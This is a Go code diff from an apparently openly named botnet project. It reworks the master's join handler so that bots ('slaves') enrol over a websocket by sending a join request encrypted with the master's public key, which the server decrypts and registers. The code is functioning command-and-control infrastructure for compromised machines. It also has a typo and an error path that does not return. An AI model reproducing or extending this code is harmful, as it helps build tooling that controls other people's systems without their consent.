@@ -2,8 +2,7 @@ package master
 
 import (
 	"encoding/json"
-	"fmt"
-	"io/ioutil"
+	"log"
 	"net/http"
 
 	"github.com/adrianosela/botnet/lib/encryption"
@@ -22,7 +21,7 @@ type KeyResponse struct {
 	Key string `json:"key"`
 }
 
-// JoinRequest is the expected payload for the join endpoint
+// JoinRequest is expected to be found in an encrypted header
 type JoinRequest struct {
 	Key string `json:"key"`
 }
@@ -40,27 +39,6 @@ func (c *Config) keyHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func (c *Config) joinHandler(w http.ResponseWriter, r *http.Request) {
-	bodyBytes, err := ioutil.ReadAll(r.Body)
-	defer r.Body.Close()
-	if err != nil {
-		w.WriteHeader(http.StatusBadRequest)
-		w.Write([]byte("could not read request body"))
-		return
-	}
-	// decrypt encrypted join request JSON
-	decryptedJoinRequest, err := encryption.DecryptMessage(bodyBytes, c.botMaster.masterPrivKey)
-	if err != nil {
-		w.WriteHeader(http.StatusBadRequest)
-		w.Write([]byte("request was not appropriately encrypted"))
-		return
-	}
-	// unmarshal decrypted bytes
-	var jr JoinRequest
-	if err := json.Unmarshal(decryptedJoinRequest, &jr); err != nil {
-		w.WriteHeader(http.StatusBadRequest)
-		w.Write([]byte("unexpected payload"))
-		return
-	}
 	// upgrade protocol to websockets connection
 	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
 	conn, err := upgrader.Upgrade(w, r, nil)
@@ -69,11 +47,31 @@ func (c *Config) joinHandler(w http.ResponseWriter, r *http.Request) {
 		w.Write([]byte("could not upgrade to WS connection"))
 		return
 	}
-	// create new slave
-	slave, err := NewSlaveCtrl(conn, jr.Key)
+
+	// first message completes the handshake, when the slave provides a JSON join
+	// request, which has been encrypted with the master's public key
+	_, encryptedMessage, err := conn.ReadMessage()
 	if err != nil {
-		w.WriteHeader(http.StatusBadRequest)
-		w.Write([]byte(fmt.Sprintf("could not create new slave: %s", err)))
+		if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+			log.Printf("WS connection was closed unexpectedly: %s", err)
+		}
+	}
+
+	jsonMsg, err := encryption.DecryptMessage(encryptedMessage, c.botMaster.masterPrivKey)
+	if err != nil {
+		log.Printf("could not decrypt message from new slave: %s", err)
+		return
+	}
+	var jr *JoinRequest
+	if err := json.Unmarshal(jsonMsg, &jr); err != nil {
+		log.Printf("could not unmarshal message from new slavde slave: %s", err)
+		return
+	}
+
+	// create new slave
+	slave, err := NewSlaveCtrl(c.botMaster, jr.Key, conn)
+	if err != nil {
+		log.Printf("could not create new slave controller for new slave: %s", err)
 		return
 	}
 	c.botMaster.EnrolSlave(slave)
